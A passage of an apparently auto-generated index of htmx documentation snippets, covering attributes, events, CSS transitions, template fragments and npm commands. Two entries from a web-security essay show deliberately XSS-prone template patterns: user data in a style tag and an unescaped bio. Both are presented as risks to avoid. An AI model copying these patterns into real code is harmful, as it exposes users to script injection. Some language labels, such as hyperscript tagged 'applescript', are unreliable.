Joe Blow\n    </p>\n    <p>\n      Email: joe@blow.com\n    </p>\n    <p>\n      <a href=\"/contacts/42/edit\">Edit</a>\n      <a href=\"/contacts/42/email\">Email</a>\n      <a href=\"/contacts/42/archive\">Archive</a>\n    </p>\n  </section>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: jQuery AJAX Request Example\nDESCRIPTION: This snippet demonstrates a basic AJAX request using jQuery's `load()` function from 2008. It loads the content of `ajax/test.html` into the element with the ID `result`. The code requires the jQuery library to be included in the project.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/htmx-sucks.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n$( \"#result\" ).load( \"ajax/test.html\" );\n```\n\n----------------------------------------\n\nTITLE: Preload Trigger: Custom Event\nDESCRIPTION: This example shows how to use a custom event (`preload:init`) to trigger preloading. This allows preloading content as soon as it has been processed by htmx.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_8\n\nLANGUAGE: HTML\nCODE:\n```\n<body hx-ext=\"preload\">\n<button hx-get=\"/server\" preload=\"preload:init\" hx-target=\"idLoadMore\">Load More</a>\n    <div id=\"idLoadMore\">\n        Content for this DIV will be preloaded as soon as the page is ready.\n        Clicking the button above will swap it into the DOM.\n    </div>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Rendering Entire Template in Java\nDESCRIPTION: This Java code snippet demonstrates how to render the entire `/contacts/detail.html` template using the `ChillTemplates` library. It retrieves a contact object and passes it as a parameter to the `render` method, allowing the template to display the contact's details.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/template-fragments.md#_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nContact c = getContact();\n  ChillTemplates.render(\"/contacts/detail.html\", \"contact\", c);\n```\n\n----------------------------------------\n\nTITLE: Handling htmx:afterRequest Event\nDESCRIPTION: This applescript snippet demonstrates how to handle the `htmx:afterRequest` event and filter based on the `failed` property. It sets the `checked` property of an element with the ID `myCheckbox` to `true` if the request fails.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/CHANGELOG.md#_snippet_0\n\nLANGUAGE: applescript\nCODE:\n```\non htmx:afterRequest[failed]\n  set #myCheckbox's checked to true\n\n```\n\n----------------------------------------\n\nTITLE: GET Request to Render Contacts Table Only\nDESCRIPTION: This snippet showcases a GET request to the `/contacts/table` endpoint, which renders only the contacts table. This endpoint is specifically designed for htmx to periodically update the table without reloading the entire page.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_3\n\nLANGUAGE: txt\nCODE:\n```\n  GET /contacts/table -> render the contacts table\n```\n\n----------------------------------------\n\nTITLE: Receiving Named Events - HTML\nDESCRIPTION: This snippet demonstrates how to receive named events from an SSE server using the `sse-swap` attribute. The name `EventName` from the server's message must match the value in the `sse-swap` attribute.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"sse\" sse-connect=\"/event-source\" sse-swap=\"EventName\"></div>\n```\n\n----------------------------------------\n\nTITLE: Customizing the htmx Logger (JavaScript)\nDESCRIPTION: This snippet shows how to customize the logger htmx uses, using the `htmx.logger` property. It assigns a new function to `htmx.logger` that logs information about events, elements, and data using `console.log`. This can be used to tailor the logging output to specific needs.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.logger = function(elt, event, data) {\n    if(console) {\n        console.log(\"INFO:\", event, elt, data);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Aborting htmx requests using htmx:abort event in HTML\nDESCRIPTION: This HTML snippet demonstrates how to use the `htmx:abort` event to cancel an ongoing htmx request.  It includes a button to initiate a request and another button that triggers the `htmx:abort` event on the first button, effectively canceling the request. The `htmx.trigger` function is used to dispatch the custom event.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/events.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<button id=\"request-button\" hx-post=\"/example\">Issue Request</button>\n<button onclick=\"htmx.trigger('#request-button', 'htmx:abort')\">Cancel Request</button>\n```\n\n----------------------------------------\n\nTITLE: CSS Styling - Request In Flight Animation\nDESCRIPTION: Defines the CSS style for the request-in-flight animation. When the `htmx-request` class is added to the form, the opacity is set to 0.5, providing visual feedback that a request is being processed.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_10\n\nLANGUAGE: css\nCODE:\n```\nform.htmx-request {\n    opacity: .5;\n    transition: opacity 300ms linear;\n  }\n```\n\n----------------------------------------\n\nTITLE: Handling an Event with Nested JSON Details\nDESCRIPTION: This JavaScript code demonstrates how to handle an event with a nested JSON object as its detail. It checks the `level` property and displays the `message` accordingly.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-trigger.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener(\"showMessage\", function(evt){\n   if(evt.detail.level === \"info\"){\n     alert(evt.detail.message);   \n   }\n})\n```\n\n----------------------------------------\n\nTITLE: Out-of-Band Swap Example - HTML\nDESCRIPTION: This snippet demonstrates how to use `hx-swap-oob` to swap a specific element directly into the DOM based on its ID, while other content is swapped into the target element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_27\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"message\" hx-swap-oob=\"true\">Swap me directly!</div>\nAdditional Content\n```\n\n----------------------------------------\n\nTITLE: Preventing XSS in Style Tags (HTML)\nDESCRIPTION: This code snippet illustrates the risk of injecting user-generated content directly into `<style>` tags. User input, even if escaped, can still lead to XSS vulnerabilities within CSS contexts. Avoid using user data to define CSS properties or values directly.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- Don't include inside CSS tags -->\n<style>\n  h1 { color: {{ user.favorite_color }} }\n</style>\n```\n\n----------------------------------------\n\nTITLE: htmx Installation via npm\nDESCRIPTION: This command demonstrates how to install htmx as a dependency using npm.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install htmx.org@2.0.4\n```\n\n----------------------------------------\n\nTITLE: Disabling default indicator styles (HTML)\nDESCRIPTION: This HTML snippet shows how to disable default htmx indicator styles. Set \"includeIndicatorStyles\" to false. The easiest way is to add this to the `<head>` of your HTML.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-indicator.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<meta name=\"htmx-config\" content='{\"includeIndicatorStyles\": false}'>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx Packages with npm\nDESCRIPTION: This code snippet demonstrates how to install the necessary packages for the htmx project using npm. It is a prerequisite for setting up a development environment and running the automated tests.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/CONTRIBUTING.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\n```\n\n----------------------------------------\n\nTITLE: HX-Location Header with JSON Payload Example\nDESCRIPTION: This snippet shows how to use a JSON payload with the HX-Location header to specify additional parameters, such as the target element to update. The `path` is required, and other parameters mirror the htmx AJAX API, allowing fine-grained control over the redirect behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-location.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\nHX-Location: {\"path\":\"/test2\", \"target\":\"#testdiv\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring htmx requests with htmx:configRequest in JavaScript\nDESCRIPTION: This JavaScript snippet shows how to listen for the `htmx:configRequest` event and modify the parameters that will be sent with the request. It demonstrates adding a new parameter, `auth_token`, to the request parameters using the `evt.detail.parameters` object.  This allows for dynamic modification of request parameters before the request is sent.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/events.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\ndocument.body.addEventListener('htmx:configRequest', function(evt) {\n    evt.detail.parameters['auth_token'] = getAuthToken(); // add a new parameter into the mix\n});\n```\n\n----------------------------------------\n\nTITLE: New HTML Content for CSS Transition Example - HTML\nDESCRIPTION: This is the new HTML content received from an htmx request, demonstrating the addition of a class for CSS transitions. The key is the consistent `id` attribute, enabling the transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_25\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"div1\" class=\"red\">New Content</div>\n```\n\n----------------------------------------\n\nTITLE: htmx Import statement for Webpack\nDESCRIPTION: This code shows how to import htmx into your JavaScript project when using Webpack.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport 'htmx.org';\n```\n\n----------------------------------------\n\nTITLE: Sending Put Request with hx-put\nDESCRIPTION: This snippet shows how to send a PUT request to a URL using htmx's `hx-put`. Sends a PUT request to the given URL. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_14\n\nLANGUAGE: html\nCODE:\n```\nhx-put\n```\n\n----------------------------------------\n\nTITLE: CSS Transition Definition - CSS\nDESCRIPTION: This CSS snippet defines a transition effect for the `red` class, which is added to the new content via htmx.  The transition will animate the color change.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_26\n\nLANGUAGE: css\nCODE:\n```\n.red {\n    color: red;\n    transition: all ease-in 1s ;\n}\n```\n\n----------------------------------------\n\nTITLE: Styling Tabs with CSS\nDESCRIPTION: This CSS code provides styling for the tabs and their content. It defines the appearance of the tab buttons, including hover and selected states, and sets the padding and margin for the tab content area. It ensures that the tab styling is visually appealing and consistent with the overall design.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-hateoas.md#_snippet_4\n\nLANGUAGE: css\nCODE:\n```\n\t#demo-canvas {\n\t\tdisplay:none;\n\t}\n\n\t#tabs > .tab-list button {\n\t\tborder: none;\n\t\tdisplay: inline-block;\n\t\tpadding: 5px 10px;\n\t\tcursor:pointer;\n\t\tbackground-color: transparent;\n\t\tcolor: var(--textColor);\n\t\tborder: solid 3px rgba(0,0,0,0);\n\t\tborder-bottom: solid 3px #eee;\n\t}\n\n\t#tabs > .tab-list button:hover {\n\t\tcolor: var(--midBlue);\n\t}\n\n\t#tabs > .tab-list button.selected {\n\t\tborder: solid 3px var(--midBlue);\n\t}\n\n\t#tabs > .tab-content {\n\t\tpadding:10px;\n\t\tmargin-bottom:100px;\n\t}\n\n```\n\n----------------------------------------\n\nTITLE: Linting Proposed Changes with npm\nDESCRIPTION: This code snippet shows how to lint the proposed changes to maintain code style consistency. This is a required step before submitting a pull request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/CONTRIBUTING.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm run format\n```\n\n----------------------------------------\n\nTITLE: hx-preserve with hx-swap-oob Example HTML\nDESCRIPTION: This example shows how `hx-preserve` can be combined with `hx-swap-oob` to preserve an element within an out-of-band swap. The `retain` element with `id=\"retain\"` will be preserved even when the `notify` div is updated using `hx-swap-oob`. This is beneficial for maintaining state in notifications or other UI elements.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-preserve.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"notify\" hx-swap-oob=\"true\">\n  Notification updated but keep the same retain\n  <div id=\"retain\" hx-preserve></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Setting htmx Configuration with Meta Tag\nDESCRIPTION: This code snippet demonstrates how to set htmx configuration options using a meta tag within an HTML document.  The `content` attribute of the meta tag contains a JSON object representing the configuration. This allows for declarative configuration of htmx settings directly within the HTML.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_60\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"htmx-config\" content='{\"defaultSwapStyle\":\"outerHTML\"}'>\n```\n\n----------------------------------------\n\nTITLE: Handling Failed Requests with htmx:afterRequest in Applescript\nDESCRIPTION: This Applescript snippet demonstrates how to use the `htmx:afterRequest` event with the `failed` detail property to trigger an action when an htmx request fails. Specifically, it sets the `checked` property of an element with the id `myCheckbox` to `true` when an `htmx:afterRequest` event with the `failed` property set to true is triggered.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2021-11-22-htmx-1.6.1-is-released.md#_snippet_0\n\nLANGUAGE: applescript\nCODE:\n```\non htmx:afterRequest[failed]\n  set #myCheckbox's checked to true\n```\n\n----------------------------------------\n\nTITLE: Fetch Content on Intersection with HTMX and Checkbox\nDESCRIPTION: This snippet combines an HTML checkbox with HTMX to fetch content from an endpoint when the checkbox's visibility intersects the viewport. The `hx-trigger` attribute is set to `intersect once` to trigger the GET request to `/log-item` upon intersection.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/you-cant.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<input id=\"published\" class=\"peer\" type=\"checkbox\" name=\"status\"/>\n<div\n        class=\"hidden peer-checked:block\"\n        hx-trigger=\"intersect once\"\n        hx-get=\"/log-item\"\n>Shell/Loading text etc\n</div>\n```\n\n----------------------------------------\n\nTITLE: Resetting Input Value after Request (HTML)\nDESCRIPTION: This HTML snippet demonstrates how to reset a specific input element's value after a successful HTMX request. It uses JavaScript within the `hx-on::after-request` attribute to target the input element by its ID and set its `value` property to an empty string, achieving a similar result to resetting a form.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/reset-user-input.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <label>Add a note</label>\n    <input id=\"note-input\" type=\"text\" name=\"note-text\" placeholder=\"blank canvas\">\n</div>\n<button class=\"btn primary\" \n        hx-post=\"/note\" \n        hx-target=\"#note\" \n        hx-swap=\"afterbegin\" \n        hx-include=\"#note-input\"\n        hx-on::after-request=\"if(event.detail.successful)\n            document.getElementById('note-input').value = ''\">\n    Add\n</button>\n<ul id=\"notes\"><!-- Response will go here --></ul>\n```\n\n----------------------------------------\n\nTITLE: HTML Archive UI Template\nDESCRIPTION: This HTML snippet represents the `archive-ui.html` template, which contains the logic for displaying either an \"Archive\" or \"Unarchive\" button based on the `contact.archived` state.  This template is intended to be included in other templates to provide the archive functionality. The template uses conditional logic to render the appropriate button with the corresponding HTMX attributes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/template-fragments.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n#if contact.archived\n<button hx-patch=\"/contacts/${contact.id}/unarchive\">Unarchive</button>\n#else\n<button hx-delete=\"/contacts/${contact.id}\">Archive</button>\n#end\n```\n\n----------------------------------------\n\nTITLE: JSON Example with Hypermedia Controls (Links)\nDESCRIPTION: This JSON snippet extends the previous example by adding hypermedia controls in the form of \"links\". These links provide URLs for related actions such as deposits, withdrawals, and transfers. While adding links introduces hypermedia controls, it is not sufficient for a fully RESTful system without a proper hypermedia client.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-clients.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"account\": {\n    \"account_number\": 12345,\n    \"balance\": {\n      \"currency\": \"usd\",\n      \"value\": 50.00\n    },\n    \"status\": \"open\",\n    \"links\": {\n      \"deposits\": \"/accounts/12345/deposits\",\n      \"withdrawals\": \"/accounts/12345/withdrawals\",\n      \"transfers\": \"/accounts/12345/transfers\",\n      \"close-requests\": \"/accounts/12345/close-requests\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining View Transition Animations with CSS\nDESCRIPTION: This CSS code defines animations for fading and sliding content during view transitions. It utilizes `@keyframes` for defining animation sequences and the `::view-transition-old()` and `::view-transition-new()` pseudo-selectors to apply different animations to the old and new content. The `.sample-transition` class ties the view transition to specific elements.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/view-transitions.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n\n    <style>\n       @keyframes fade-in {\n         from { opacity: 0; }\n       }\n    \n       @keyframes fade-out {\n         to { opacity: 0; }\n       }\n    \n       @keyframes slide-from-right {\n         from { transform: translateX(90px); }\n       }\n    \n       @keyframes slide-to-left {\n         to { transform: translateX(-90px); }\n       }\n    \n       /* define animations for the old and new content */\n       ::view-transition-old(slide-it) {\n         animation: 180ms cubic-bezier(0.4, 0, 1, 1) both fade-out,\n         600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-to-left;\n       }\n       ::view-transition-new(slide-it) {\n         animation: 420ms cubic-bezier(0, 0, 0.2, 1) 90ms both fade-in,\n         600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-from-right;\n       }\n    \n       /* tie the view transition to a given CSS class */\n       .sample-transition {\n           view-transition-name: slide-it;\n       }\n        \n    </style>\n\n```\n\n----------------------------------------\n\nTITLE: Out-of-Band Swap with Template Tag for Table Rows - HTML\nDESCRIPTION: This snippet demonstrates using a `template` tag to encapsulate table row elements for out-of-band swaps. This is necessary because table elements like `<tr>` cannot stand alone in the DOM.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_28\n\nLANGUAGE: html\nCODE:\n```\n<template>\n  <tr id=\"message\" hx-swap-oob=\"true\"><td>Joe</td><td>Smith</td></tr>\n</template>\n```\n\n----------------------------------------\n\nTITLE: HTML Template with Template Fragment\nDESCRIPTION: This HTML snippet showcases the use of a template fragment using the `#fragment` directive. The `archive-ui` fragment encapsulates the logic for displaying the \"Archive\" or \"Unarchive\" button.  This allows rendering the entire template or just the fragment, providing a cleaner approach to managing partial updates without splitting the template into multiple files.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/template-fragments.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<html>\n    <body>\n        <div hx-target=\"this\">\n          #fragment archive-ui\n            #if contact.archived\n            <button hx-patch=\"/contacts/${contact.id}/unarchive\">Unarchive</button>\n            #else\n            <button hx-delete=\"/contacts/${contact.id}\">Archive</button>\n            #end\n          #end\n        </div>\n        <h3>Contact</h3>\n        <p>${contact.email}</p>\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: CSS for Fading Out Table Row on Delete (HTMX)\nDESCRIPTION: This CSS snippet defines a style for fading out the table row during the HTMX swap operation. It sets the opacity to 0 and applies a transition effect for a smooth fade-out before the row is removed.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/delete-row.md#_snippet_1\n\nLANGUAGE: css\nCODE:\n```\ntr.htmx-swapping td {\n  opacity: 0;\n  transition: opacity 1s ease-out;\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Styling - Toggle Opacity\nDESCRIPTION: Defines the CSS style for toggling the opacity of a div.  The `.demo.faded` class sets the opacity to 0.3, while the `.demo` class sets the opacity to 1 and applies a 900ms ease-in transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_13\n\nLANGUAGE: css\nCODE:\n```\n.demo.faded {\n  opacity:.3;\n}\n.demo {\n  opacity:1;\n  transition: opacity ease-in 900ms;\n}\n```\n\n----------------------------------------\n\nTITLE: Loading content into an element using jQuery's load() function\nDESCRIPTION: This JavaScript snippet demonstrates how to use jQuery's `load()` function to load content from a specified URL into a target element. The `load()` function is a simple way to fetch content from the server and inject it into a part of the page, similar to functionality provided by hypermedia libraries like htmx.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/alternatives.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n  $( \"#result\" ).load( \"ajax/test.html\" );\n```\n\n----------------------------------------\n\nTITLE: HTTP Accept Header Example\nDESCRIPTION: This code snippet shows an example of an `Accept` header in an HTTP request. It demonstrates how a client indicates its preferred content types to the server. The `q` parameter indicates the preference level, and `*` is used as a wildcard.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/why-tend-not-to-use-content-negotiation.md#_snippet_0\n\nLANGUAGE: http request\nCODE:\n```\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8\n```\n\n----------------------------------------\n\nTITLE: Establishing Server Sent Events connection with hx-sse\nDESCRIPTION: This HTML snippet demonstrates how to establish a Server Sent Events (SSE) connection using the `hx-sse` attribute in htmx. The `hx-sse=\"connect /event_stream\"` attribute initiates a connection to the specified event stream endpoint.  A nested div utilizes `hx-get` to fetch data from `/chatroom` and is triggered when a 'sse:chatter' event is received from the server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2020-5-24-htmx-0.0.4-is-released.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-sse=\"connect /event_stream\">\n    <div hx-get=\"/chatroom\" hx-trigger=\"sse:chatter\">\n      ...\n    </div>\n  </div>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Code with HTMX\nDESCRIPTION: These Javascript functions define mock server routes and responses for demonstration purposes. They handle a GET request to `/modal` and return the HTML content for a UIKit modal dialog.  The demoenv() function initializes these routes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-uikit.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n    // routes\n    init(\"/demo\", function(request, params) {\n\t\treturn `\n<button \n\tclass=\"uk-button uk-button-primary\" \n\thx-get=\"/modal\" \n\thx-trigger=\"click\" \n\thx-target=\"#modals-here\"\n\t_=\"on htmx:afterOnLoad wait 10ms then add .uk-open to #modal\">Show Modal Dialog</button>`\n\t})\n\t\t\n\tonGet(\"/modal\", function(request, params){\n\t  return `\n<div id=\"modal\" class=\"uk-modal\" style=\"display:block;\">\n\t<div class=\"uk-modal-dialog uk-modal-body\">\n\t\t<h2 class=\"uk-modal-title\">Modal Dialog</h2>\n\t\t<p>This modal dialog was loaded dynamically by HTMX.  You can put any server request here and you don't (necessarily) need to use the UIKit Javascript file to make it work</p>\n\n\t\t<form _=\"on submit take .uk-open from #modal\">\n\t\t\t<div class=\"uk-margin\">\n\t\t\t\t<input class=\"uk-input\" placeholder=\"What is Your Name?\">\n\t\t\t</div>\n\n\t\t\t<div class=\"uk-margin\">\n\t\t\t\t<input class=\"uk-input\" placeholder=\"What is Your Quest?\">\n\t\t\t</div>\n\n\t\t\t<div class=\"uk-margin\">\n\t\t\t\t<input class=\"uk-input\" placeholder=\"What is Your Favorite Color?\">\n\t\t\t</div>\n\n\t\t\t<button type=\"button\" class=\"uk-button uk-button-primary\" _=\"on click call alert('submit to server and close dialog.')\">Save Changes</button>\n\t\t\t<button type=\"button\" class=\"uk-button uk-button-default\" _=\"on click take .uk-open from #modal wait 200ms then remove #modal\">Close</button>\n\t\t</form>\n\t</div>\n</div>`\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Workbox CLI Globally\nDESCRIPTION: This command installs the Workbox command-line interface (CLI) globally using npm.  Workbox is a set of libraries that help streamline the process of building service workers for web applications. Installing the CLI allows developers to use Workbox's features directly from the command line.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/you-cant.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install workbox-cli --global\n```\n\n----------------------------------------\n\nTITLE: JSON Data API Response Example\nDESCRIPTION: This JSON snippet represents a sample response from a JSON Data API endpoint, specifically for retrieving account information. It includes account number, balance (currency and value), and account status. This is a standard representation used for application-level decoupling.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/two-approaches-to-decoupling.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"account\": {\n        \"account_number\": 12345,\n        \"balance\": {\n            \"currency\": \"usd\",\n            \"value\": -50.00\n        },\n        \"status\": \"overdrawn\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing View Transition API in JavaScript\nDESCRIPTION: This code snippet demonstrates how to initialize a view transition using the `document.startViewTransition` API in JavaScript. It wraps the DOM update logic within the transition function to ensure a smooth visual transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/view-transitions.md#_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n\n  // this is all it takes to get a smooth transition from one \n  // state to another!\n  document.startViewTransition(() => updateTheDOMSomehow(data));\n\n```\n\n----------------------------------------\n\nTITLE: Building Service Worker with Workbox\nDESCRIPTION: This command builds a service worker file (`sw.js`) using the Workbox CLI.  It takes the `workbox-config.js` file as input, which contains the configuration for how the service worker should handle caching and network requests. The resulting `sw.js` file can then be registered in the web application.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/you-cant.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nworkbox generateSW workbox-config.js\n```\n\n----------------------------------------\n\nTITLE: HTML rendering user bio example\nDESCRIPTION: HTML code representing rendering a user bio from database. This snippet shows how a user's bio, stored in the database (`{{ user.bio }}`), is rendered within a paragraph element. Without proper escaping, this can be a security risk, leading to potential XSS vulnerabilities if the user's bio contains malicious scripts.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<p>\n{{ user.bio }}\n</p>\n```\n\n----------------------------------------\n\nTITLE: Setting ignoreTitle Swap Option in hx-swap - HTML\nDESCRIPTION: This snippet demonstrates how to disable the automatic title update behavior of htmx by setting the `ignoreTitle` modifier to `true` within the `hx-swap` attribute.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_20\n\nLANGUAGE: html\nCODE:\n```\n    <button hx-post=\"/like\" hx-swap=\"outerHTML ignoreTitle:true\">Like</button>\n```\n\n----------------------------------------\n\nTITLE: JSON Example without Hypermedia Controls\nDESCRIPTION: This JSON snippet illustrates a simple account representation without any hypermedia controls. It includes basic information such as account number, balance, and status. The absence of hypermedia controls makes it a non-hypermedia representation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-clients.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"account\": {\n    \"account_number\": 12345,\n    \"balance\": {\n      \"currency\": \"usd\",\n      \"value\": 50.00\n    },\n    \"status\": \"open\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pushing URL with hx-push-url\nDESCRIPTION: This snippet shows how to push a URL to the browser's history using htmx's `hx-push-url`. Updates the browser's URL in history. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_13\n\nLANGUAGE: html\nCODE:\n```\nhx-push-url\n```\n\n----------------------------------------\n\nTITLE: UIKit Modal Content\nDESCRIPTION: This HTML snippet represents the structure of a UIKit modal dialog. It includes the necessary classes for UIKit styling and can be dynamically loaded by HTMX. Hyperscript is used to control the modal's visibility and animations on form submission or cancellation. The `style=\"display:block;\"` attribute is used to make the modal visible initially.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-uikit.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"modal\" class=\"uk-modal\" style=\"display:block;\">\n\t<div class=\"uk-modal-dialog uk-modal-body\">\n\t\t<h2 class=\"uk-modal-title\">Modal Dialog</h2>\n\t\t<p>This modal dialog was loaded dynamically by HTMX.</p>\n\n\t\t<form _=\"on submit take .uk-open from #modal\">\n\t\t\t<div class=\"uk-margin\">\n\t\t\t\t<input class=\"uk-input\" placeholder=\"What is Your Name?\">\n\t\t\t</div>\n\t\t\t<button type=\"button\" class=\"uk-button uk-button-primary\">Save Changes</button>\n\t\t\t<button \n\t\t\t\tid=\"cancelButton\"\n\t\t\t\ttype=\"button\" \n\t\t\t\tclass=\"uk-button uk-button-default\" \n\t\t\t\t_=\"on click take .uk-open from #modal wait 200ms then remove #modal\">Close</button>\n\t\t</form>\n\t</div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Preload Trigger: mousedown\nDESCRIPTION: This example shows how to configure the preload extension to trigger on the `mousedown` event. This is the default behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"/server/1\" preload=\"mousedown\">This will be preloaded when the user begins to click.</a>\n```\n\n----------------------------------------\n\nTITLE: Styling Memes Section\nDESCRIPTION: This CSS snippet styles the memes section of the page. It centers the text within the .memes container and sets minimum height and maximum width for the images, along with margins.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/_index.md#_snippet_0\n\nLANGUAGE: css\nCODE:\n```\n  .memes {\n    text-align: center;\n  }\n  .memes img {\n     min-height: 200px;\n     max-width: 100%;\n     margin: 32px;\n   }\n```\n\n----------------------------------------\n\nTITLE: Generating Workbox Configuration File\nDESCRIPTION: This command generates a Workbox configuration file using the Workbox CLI wizard. The wizard guides the user through a series of prompts to configure the service worker's behavior, such as caching strategies and asset handling.  The generated configuration file will be named `workbox-config.js` by default.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/you-cant.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nworkbox wizard\n```\n\n----------------------------------------\n\nTITLE: HTTP GET Request Example\nDESCRIPTION: This snippet shows an example of an HTTP GET request made by a web browser to fetch a bank account resource. It includes the HTTP method, path, and host 